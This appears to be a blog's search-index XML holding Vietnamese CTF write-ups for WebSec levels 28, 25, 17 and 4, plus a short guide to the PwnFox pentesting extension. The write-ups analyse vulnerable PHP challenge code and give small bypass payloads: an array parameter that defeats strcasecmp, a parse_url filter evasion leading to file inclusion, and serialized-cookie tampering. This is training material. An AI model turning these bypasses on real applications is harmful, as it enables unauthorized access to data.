<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>[WebSec] Level 28</title>
    <link href="/2022/08/04/level28/"/>
    <url>/2022/08/04/level28/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://websec.fr/level28/index.php">https://websec.fr/level28/index.php</a></p></blockquote><h3 id="Gathering-information"><a href="#Gathering-information" class="headerlink" title="Gathering information"></a><strong>Gathering information</strong></h3><p>Th√¥i, b√†i n√†y m√¨nh kh√¥ng test ki·ªÉu BlackBox n·ªØa‚Ä¶ V√¨ test c√≥ ra l·ªói ƒë√¢u &#x3D;))</p><p>V√†o ƒë·ªçc source code th√¥i. C√°c challenge CTF th∆∞·ªùng th√¨ h·ªç ƒë·ªÅu cho m√¨nh source ƒë·ªÉ ƒë·ªçc. </p><p>C√°c b·∫°n c√≥ th·ªÉ theo d√µi ƒëo·∫°n code b√™n d∆∞·ªõi.</p><h4 id="Source-code"><a href="#Source-code" class="headerlink" title="Source code"></a><strong>Source code</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;flag_file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">4096</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Your file is too heavy.&#x27;</span>);<br>  &#125;<br>  <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;./tmp/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;.php&#x27;</span>;<br><br>  <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;flag_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;r&#x27;</span>);<br>  <span class="hljs-variable">$flagfilecontent</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;flag_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]));<br>  @<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br><br>  <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$flagfilecontent</span>);<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5_file</span>(<span class="hljs-variable">$filename</span>) === <span class="hljs-title function_ invoke__">md5_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;checksum&#x27;</span>] == <span class="hljs-title function_ invoke__">crc32</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;checksum&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>);  <span class="hljs-comment">// it contains the `$flag` variable</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;Nope, <span class="hljs-subst">$filename</span> is not the right file, sorry.&quot;</span>;<br>        <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// Deter bruteforce</span><br>    &#125;<br><br>  <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>------------------------------------------------------------------------------------------<br><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$flag</span>))&#123; <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>; &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Can you guess it?&#x27;</span>; &#125;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Ph√¢n t√≠ch v·ªÅ source code:</p><ul><li><p>T·ª´ d√≤ng 1 - 5: H√†m <code>if()</code> ki·ªÉm tra m√¨nh ƒë√£ submit hay kh√¥ng? N·∫øu c√≥ th√¨ file upload c·ªßa m√¨nh l√™n c√≥ n·∫∑ng qu√° <code>4096 kb</code> hay kh√¥ng? N·∫øu n·∫∑ng qu√° <code>4096 kb</code> th√¨ s·∫Ω b√°o l·ªói l√† <code>Your file is too heavy.</code> v√† <code>die</code> ch∆∞∆°ng tr√¨nh.</p></li><li><p>D√≤ng 6: <code>$file_name</code> s·∫Ω ƒë∆∞·ª£c g√°n b·∫±ng gi√° tr·ªã nh∆∞ tr√™n source code, v·ªõi <code>md5($_SERVER[&#39;REMOTE_ADDR&#39;])</code> s·∫Ω l√† gi√° tr·ªã IP m√¨nh ƒëang truy c·∫≠p ƒë∆∞·ª£c <code>encrypt md5</code>.</p><ul><li><code>./tmp/ae018b12db79741c0b9026378e0be6d5.php</code><br>  <img src="/img/CTF/WebSec/lv28/md5_ip.png" alt="nslookup ip"></li></ul></li><li><p>D√≤ng 12: n·ªôi dung trong file ƒë∆∞·ª£c upload s·∫Ω ƒë∆∞·ª£c g√°n cho <code>$file_name</code>.</p></li><li><p>D√≤ng 13: Trong h√†m <code>if()</code> ki·ªÉm tra <code>md5($file_upload</code>) ph·∫£i tr√πng v·ªõi n·ªôi dung trong file flag <code>md5(flag.php)</code>. K·∫øt h·ª£p vi·ªác vi·ªác <code>loose compare</code> gi·ªØa <code>checksum</code> m√¨nh nh·∫≠p v√†o v√† <code>crc32(&#39;checksum&#39;)</code>.</p></li><li><p>ƒê·ªÉ bypass qua ƒë∆∞·ª£c <code>loose compare</code> c·ªßa <strong>checksum</strong> th√¨ m√¨nh s·∫Ω d√πng <code>Array()</code> ƒë·ªÉ so s√°nh.</p></li></ul><p><img src="/img/CTF/WebSec/lv28/crc_bypass.png" alt="nslookup ip"></p><p><strong><em>Typing ‚Ä¶</em></strong></p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a><strong>Exploit</strong></h3><p><strong><em>Stuffing ‚Ä¶</em></strong></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Websec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>babysteps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[WebSec] Level 25</title>
    <link href="/2022/07/30/level25/"/>
    <url>/2022/07/30/level25/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="http://websec.fr/level25/index.php">http://websec.fr/level25/index.php</a></p></blockquote><h3 id="Gathering-information"><a href="#Gathering-information" class="headerlink" title="Gathering information"></a><strong>Gathering information</strong></h3><p>ƒê·∫ßu ti√™n v·∫´n th·ª≠ c√°c payloads v·ªÅ SQLi, v·ªÅ XSS, ‚Ä¶ Tuy nhi√™n v·∫´n kh√¥ng c√≥ l·ªói g√¨ xu·∫•t hi·ªán. </p><p>View-source challenge th√¨ m√¨nh c·∫ßn ch√∫ √Ω ƒë·∫øn 2 ƒëo·∫°n code <code>PHP</code> trong ƒë√≥.</p><h4 id="Source-code-1"><a href="#Source-code-1" class="headerlink" title="Source code 1"></a><strong>Source code 1</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: http://websec.fr/level25/index.php?page=main&#x27;</span>);<br>  <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>V·ªõi ƒëo·∫°n <code>code 1</code> tr√™n th√¨ check xem trong URL c·ªßa ch√∫ng c√≥ t·ªìn t·∫°i <code>parameter page</code> kh√¥ng. N·∫øu kh√¥ng c√≥, th√¨ s·∫Ω Redirect sang trang c√≥ <code>page=main</code> (trang ch·ªß c·ªßa challenge).</p><h4 id="Source-code-2"><a href="#Source-code-2" class="headerlink" title="Source code 2"></a><strong>Source code 2</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>])[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$v</span>, <span class="hljs-string">&#x27;flag&#x27;</span>) !== <span class="hljs-literal">false</span>)<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You are not allowed to get the flag, sorry :/&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] . <span class="hljs-string">&#x27;.txt&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>V·ªõi ƒëo·∫°n <code>code 2</code> ·ªü tr√™n, ch√∫ng ta c√≥ nhi·ªÅu v·∫•n ƒë·ªÅ ƒë·ªÉ ph√¢n t√≠ch h∆°n.<br>D√≤ng code th·ª© 2, h√†m <code>parse_url()</code> c√≥ ch·ª©c nƒÉng ph√¢n t√≠ch c√°c th√†nh ph√¢n c·ªßa URL ra. Sau ƒë√≥ s·∫Ω g√°n v√†o bi·∫øn <code>$query</code>.</p><p>H√†m <a href="https://www.php.net/manual/en/function.parse-url.php">parse_url()</a> ho·∫°t ƒë·ªông nh∆∞ sau:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs txt">- $url: &quot;http://example.com/thu-muc/file.php?cmd=ls#rce&quot;<br>- Sau khi ƒë∆∞a bi·∫øn v√†o h√†m parse_url() th√¨ h·∫øt qu·∫£ ra s·∫Ω l√†:<br><br>array(5) &#123;<br>  [&quot;scheme&quot;]=&gt;<br>  string(4) &quot;http&quot;<br>  [&quot;host&quot;]=&gt;<br>  string(11) &quot;example.com&quot;<br>  [&quot;path&quot;]=&gt;<br>  string(17) &quot;/thu-muc/file.php&quot;<br>  [&quot;query&quot;]=&gt;<br>  string(6) &quot;cmd=ls&quot;<br>  [&quot;fragment&quot;]=&gt;<br>  string(3) &quot;rce&quot;<br>&#125;<br><br>- Return c·ªßa h√†m parse_url() l√†: int|string|array|null|false<br></code></pre></td></tr></table></figure><p>Sau khi v√†o v√≤ng <code>for</code>, n·∫øu nh∆∞ gi√° tr·ªã trong <code>$query</code> l√∫c n√†y ch√≠nh k·∫øt qu·∫£ ƒë·∫ßu ra c·ªßa h√†m <code>parse_url()</code> m√† kh√°c <code>false</code> th√¨ ch∆∞∆°ng tr√¨nh s·∫Ω <code>die</code>.</p><p><em>V·∫≠y, l√†m sao ƒë·ªÉ ch∆∞∆°ng tr√¨nh kh√¥ng <code>die</code>?</em></p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a><strong>Exploit</strong></h3><p>ƒê·ªÉ ch∆∞∆°ng tr√¨nh in ra ƒë∆∞·ª£c flag, th√¨ ph·∫£i bypass qua v√≤ng <code>for</code>.</p><h4 id="Search-Google-‚Äúparse-url-return-false-in-php‚Äù"><a href="#Search-Google-‚Äúparse-url-return-false-in-php‚Äù" class="headerlink" title="Search Google: ‚Äúparse_url return false in php‚Äù"></a><strong>Search Google</strong>: ‚Äúparse_url return false in php‚Äù</h4><blockquote><p><a href="https://stackoverflow.com/questions/47807529/how-to-avoid-php-parse-url-return-false-when-parse-sa-12b-12-3-3-41233-whi">https://stackoverflow.com/questions/47807529/how-to-avoid-php-parse-url-return-false-when-parse-sa-12b-12-3-3-41233-whi</a></p></blockquote><p>Sau khi tham kh·∫£o link tr√™n k·∫øt h·ª£p vi·ªác debug, th√¨ m√¨nh ph·∫£i cho c√°i c·∫•u tr√∫c c·ªßa c√°c param sau khi qua h√†m parse_url k·∫øt qu·∫£ b·ªã sai.</p><p>V√≠ d·ª•:</p><ul><li><code>http://example.com///thu-muc/file.php?...</code><br>-&gt; <code>///</code> s·∫Ω l√†m cho parse_url() hi·ªÉu l√† host. N√™n s·∫Ω b·ªã sai.</li><li><code>http://example.com/thu-muc/file.php?cmd=ls&amp;a=1.1.1.1:39</code><br>-&gt; <code>&amp;a</code> c√≥ gi√° tr·ªã l√† host:port, c≈©ng s·∫Ω l√†m cho parse_url() hi·ªÉu sai.</li></ul><p>M·ª•c ƒë√≠ch c·ªßa m√¨nh l·∫•y flag ·ªü file flag.txt. V√¨ sau thi include page v√†o th√¨ ch∆∞∆°ng tr√¨nh s·∫Ω t·ª± g·∫Øn ƒëu√¥i txt cho m√¨nh.</p><p>Vi·ªác c√≤n l·∫°i ch·ªâ l·∫•y flag th√¥i.</p><p><img src="/img/CTF/WebSec/lv25/flag.png" alt="Got the flag"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Websec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>babysteps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[WebSec] Level 17</title>
    <link href="/2022/07/24/Level17/"/>
    <url>/2022/07/24/Level17/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://websec.fr/level17/index.php">https://websec.fr/level17/index.php</a></p></blockquote><hr><h3 id="Gathering-information"><a href="#Gathering-information" class="headerlink" title="Gathering information"></a><strong>Gathering information</strong></h3><p>Nh∆∞ th∆∞·ªùng l·ªá, b∆∞·ªõc ƒë·∫ßu ti√™n ch√∫ng ta ng√≥ xem qua ph·∫ßn giao di·ªán, c√≥ ch·ªó input v√† button Submit.</p><p>N√≥ y√™u c·∫ßu m√¨nh ƒëo√°n flag, n√™n th·ª≠ nh·∫≠p ƒë·∫°i g√¨ ƒë√≥, v√† xem response tr·∫£ v·ªÅ th·∫ø n√†o. Kh√¥ng c√≥ g√¨ ƒë√°ng ch√∫ √Ω h∆°n link t·ªõi source code.</p><p>Challenge cho s·∫µn lu√¥n source code, ch√∫ng qua v√† ƒë·ªÉ √Ω ƒë·∫øn 2 ph·∫ßn code PHP.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sleep_rand</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">/* I wish php5 had random_int() */</span><br>        <span class="hljs-variable">$range</span> = <span class="hljs-number">100000</span>;<br>        <span class="hljs-variable">$bytes</span> = (<span class="hljs-keyword">int</span>) (<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-variable">$range</span>, <span class="hljs-number">2</span>) / <span class="hljs-number">8</span>) + <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">do</span> &#123;  <span class="hljs-comment">/* Side effect: more random cpu cycles wasted ;) */</span><br>            <span class="hljs-variable">$rnd</span> = <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="hljs-variable">$bytes</span>)));<br>        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-variable">$rnd</span> &gt;= <span class="hljs-variable">$range</span>);<br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-variable">$rnd</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ƒêo·∫°n code tr√™n ch·ªâ l√† h√†m ƒë·ªÉ delay trong qu√° tr√¨nh th·ª±c thi ch∆∞∆°ng tr√¨nh. Khi n√†o g·ªçi l·∫°i h√†m <code>sleep_rand()</code> th√¨ ƒëo·∫°n x·ª≠ l√≠ ƒë√≥ s·∫Ω delay.</p><p>Th·ªùi gian delay l√¢u hay mau ph·ª• thu·ªôc v√†o h√†m random ·ªü d√≤ng 8. H√†m <code>openssl_random_pseudo_bytes()</code> s·∫Ω t·∫°o ra random string pseudo_bytes t·ª´ param $bytes ·ªü d·∫°ng binary.</p><p>Sau ƒë√≥ h√†m <code>bin2hex()</code> s·∫Ω convert binary sang d·∫°ng hex. Ti·∫øp theo h√†m <code>hexdec()</code> s·∫Ω convert hex sang d·∫°ng decemal.</p><p>ƒê·∫°i kh√°i l√† h√†m tr√™n c≈©ng kh√¥ng ·∫£nh h∆∞∆°ng t·ªõi challenge nhi·ªÅu, v√¨ h√†m <code>usleep()</code> s·∫Ω delay ch∆∞∆°ng tr√¨nh v·ªõi param l√† <strong>micro second</strong>. V√≠ d·ª• <code>usleep(2000000)</code> th√¨ s·∫Ω delay 2s.</p><hr><p>Ti·∫øp ƒë·∫øn source code c√≤n l·∫°i:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-title function_ invoke__">strcasecmp</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>], <span class="hljs-variable">$flag</span>))<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;alert alert-success&quot;&gt;Here is your flag: &lt;mark&gt;&#x27;</span> . <span class="hljs-variable">$flag</span> . <span class="hljs-string">&#x27;&lt;/mark&gt;.&lt;/div&gt;&#x27;</span>;   <br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;alert alert-danger&quot;&gt;Invalid flag, sorry.&lt;/div&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Quan s√°t th·∫•y th√¨ ƒëo·∫°n code ph√≠a tr√™n s·∫Ω so s√°nh gi√° tr·ªã c·ªßa <code>flag</code> khi input t·ª´ user v√†o v√† gi√° tr·ªã <code>$flag</code> ƒë√£ assign trong ch∆∞∆°ng tr√¨nh. </p><p>Nh∆∞ng ƒë·ªÉ so s√°nh th√¨ d√πng h√†m <code>strcasecmp()</code>, ƒëi·ªÅu ƒë√°ng n√≥i h∆°n ·ªü ƒë√¢y l√† d·∫•u ch·∫•m thang ·ªü ph√≠a tr∆∞·ªõc h√†m.</p><blockquote><p>H√†m <code>strcasecmp($str1, $str2)</code> s·∫Ω nh·∫≠n v√†o 2 string ƒë·ªÉ so s√°nh. K·∫øt qu·∫£ tr·∫£ v·ªÅ l√†:</p><ul><li>&gt; 0: N·∫øu nh∆∞ $str1 &gt; $str2.</li><li>&lt; 0: N·∫øu nh∆∞ $str1 &lt; $str2.</li><li>&#x3D; 0: N·∫øu nh∆∞ $str1 &#x3D; $str2.</li></ul></blockquote><p>D·∫•u ch·∫•m thang ·ªü ph√≠a tr∆∞·ªõc c√≥ nghƒ©a l√† <code>$str1</code> v√† <code>$str2</code> b·∫±ng nhau.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (! <span class="hljs-title function_ invoke__">strcasecmp</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>], <span class="hljs-variable">$flag</span>))<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strcasecpm</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>], <span class="hljs-variable">$flag</span>) == <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>Hai d√≤ng code tr√™n l√† t∆∞∆°ng t·ª± nhau v·ªÅ m·∫∑t ch·ª©c nƒÉng v√† b·∫£n ch·∫•t.</p><p>Khi so s√°nh <code>==</code> th√¨ l·∫°i ƒë·ªÉ √Ω t·ªõi l·ªói <a href="https://www.invicti.com/blog/web-security/php-type-juggling-vulnerabilities/">Type Jugling</a> v√† tham kh·∫£o hai h√¨nh b√™n d∆∞·ªõi.</p><p><img src="/img/CTF/WebSec/lv17/loose-comparison.png" alt="Loose"></p><p><img src="/img/CTF/WebSec/lv17/strict-comparison.png" alt="Strict"><br>&#96;</p><hr><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a><strong>Exploit</strong></h3><p>Khi m√† so s√°nh trong h√†m <code>strcasecpm()</code> s·∫Ω cho ra k·∫øt qu·∫£ l√† <code>False</code>. Ti·∫øp theo <code>False</code> so v·ªõi <code>0</code> th√¨ s·∫Ω l√† <code>True</code>.</p><p><img src="/img/CTF/WebSec/lv17/debug1.png" alt="Debug compare"></p><p>T·ª´ ƒë√≥, s·∫Ω t√¨m ra ƒë∆∞·ª£c flag.</p><blockquote><p>Payload: <strong>flag[]&#x3D;1</strong></p></blockquote><p>K·∫øt qu·∫£:</p><p><img src="/img/CTF/WebSec/lv17/kq.png" alt="KetQua"></p><h3 id="References"><a href="#References" class="headerlink" title="References"></a><strong>References</strong></h3><p><a href="https://techgeekgalaxy.com/php-equality-comparisons/#:~:text=or%20security%20exploits.-,Strict%20Comparison%20(%3D%3D%3D),types%20then%20false%20is%20returned.">https://techgeekgalaxy.com/php-equality-comparisons/#:~:text=or%20security%20exploits.-,Strict%20Comparison%20(%3D%3D%3D),types%20then%20false%20is%20returned.</a></p><p><a href="https://danuxx.blogspot.com/2013/03/unauthorized-access-bypassing-php-strcmp.html">https://danuxx.blogspot.com/2013/03/unauthorized-access-bypassing-php-strcmp.html</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Websec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>babysteps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PwnFox Extension on Firefox for Pentester</title>
    <link href="/2022/07/20/PwnFox/"/>
    <url>/2022/07/20/PwnFox/</url>
    
    <content type="html"><![CDATA[<p>Trong b√†i vi·∫øt n√†y, m√¨nh s·∫Ω gi·ªõi thi·ªáu m·ªçi ng∆∞·ªùi m·ªôt extension chuy√™n d√πng cho vi·ªác c√†i ƒë·∫∑t proxy cho Burp Suite, ngo√†i ra n√≥ c√≤n c√≥ nhi·ªÅu t√≠nh nƒÉng hay ho n·ªØa üòç.</p><blockquote><p>Link extension: <a href="https://github.com/yeswehack/PwnFox">https://github.com/yeswehack/PwnFox</a></p></blockquote><h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a><strong>Install</strong></h3><p>C√°c b·∫°n v√†o link github ·ªü tr√™n, download file pwnfox.jar v·ªÅ m√°y v√† l∆∞u n√≥ ·ªü th∆∞ m·ª•c n√†o m√† b·∫°n mu·ªën.</p><p><img src="/img/Technical/PwnFox/image1.png" alt="Download PwnFox.jar"></p><p>Sau khi t·∫£i extension xong, m·ªü ·ª©ng d·ª•ng Burp Suite l√™n, v√†o tab <strong>Extension</strong>.</p><p><img src="/img/Technical/PwnFox/image2.png" alt="Add Extender"></p><p>Ch·ªçn Add, c·ª≠a s·ªï Load Burp Extension hi·ªán l√™n, ch·ªçn ƒë·∫øn file pwnfox.jar v·ª´a t·∫£i l√∫c n√£y, sau ƒë√≥ b·∫•m Next l√† xong.</p><h3 id="Set-up"><a href="#Set-up" class="headerlink" title="Set up"></a><strong>Set up</strong></h3><p>M·ªü tr√¨nh duy·ªát FireFox, t√¨m ki·∫øm <a href="https://addons.mozilla.org/vi/firefox/addon/pwnfox/">pwnfox entension</a>.</p><p><img src="/img/Technical/PwnFox/image3.png" alt="PwnFox for FireFox"></p><p>Sau khi c√†i extension cho Firefox, setting c·ªßa Pwnfox ki·ªÉm tra IP v√† PORT ƒë√£ ƒë√∫ng ch∆∞a.</p><p><img src="/img/Technical/PwnFox/image4.png"></p><p>B∆∞·ªõc cu·ªëi c√πng l√† v√†o ph·∫ßn Setting Network c·ªßa Firefox ƒë·ªÉ l·ª±a ch·ªçn <strong>No proxy</strong>.</p><p><img src="/img/Technical/PwnFox/image5.png" alt="No Proxy Setting"></p><h3 id="Tinh-nang-container-tab"><a href="#Tinh-nang-container-tab" class="headerlink" title="T√≠nh nƒÉng container tab"></a><strong>T√≠nh nƒÉng container tab</strong></h3><p>N√≥ s·∫Ω l√† nh·ªØng tab c√≥ m√†u s·∫Øc tr√™n firefox.</p><p><img src="/img/Technical/PwnFox/image6.png"></p><p>M·ªói tab s·∫Ω ho·∫°t ƒë·ªông ƒë·ªôc l·∫≠p v·ªõi c√°c session kh√°c nhau.</p><p>Khi ƒëi qua proxy Burp Suite, v√†o history s·∫Ω th·∫•y ƒë∆∞·ª£c m√†u c·ªßa c√°c tab t∆∞∆°ng ·ª©ng.</p><p><img src="/img/Technical/PwnFox/image7.png" alt="Color items"></p>]]></content>
    
    
    <categories>
      
      <category>Technical</category>
      
    </categories>
    
    
    <tags>
      
      <tag>extension</tag>
      
      <tag>pwnfox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[WebSec] Level 4</title>
    <link href="/2022/07/19/Level4/"/>
    <url>/2022/07/19/Level4/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://websec.fr/level04/index.php">https://websec.fr/level04/index.php</a></p></blockquote><h3 id="Gathering-information"><a href="#Gathering-information" class="headerlink" title="Gathering information"></a><strong>Gathering information</strong></h3><p>Challenge n√†y c√≥ ch·ªó input l√† id, nh∆∞ng kh√¥ng gi·ªëng nh∆∞ Level 1 l√† s·∫Ω ra l·ªói khi nh·∫≠p k√Ω t·ª± ƒë·∫∑c bi·ªát.</p><p>V·ªõi gi√° tr·ªã cookie leet_hax0r: Decode base64 ra th√¨ l√† m·ªôt d·∫°ng json sau khi <a href="https://snoopysecurity.github.io/web-application-security/2021/01/08/02_php_object_injection_exploitation-notes.html">serialize</a>.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">a<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ip&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">13</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;116.96.78.101&quot;</span>;<span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>√ù nghƒ©a c·ªßa c√°c th√†nh ph·∫ßn ƒëo·∫°n JSON tr√™n l√†:</p><blockquote><p>a: array s·∫Ω ch·ª©a 1 gi√° tr·ªã duy nh·∫•t l√† <code>ip</code>.<br><code>ip</code> c√≥ ƒë·ªô d√†i l√† 2, v√† c√≥ <code>value</code> d√†i 13 k√≠ t·ª±.</p></blockquote><p>C·∫•u tr√∫c c·ªßa Serialize trong PHP c√≥ d·∫°ng <code>data-type:data</code>.</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 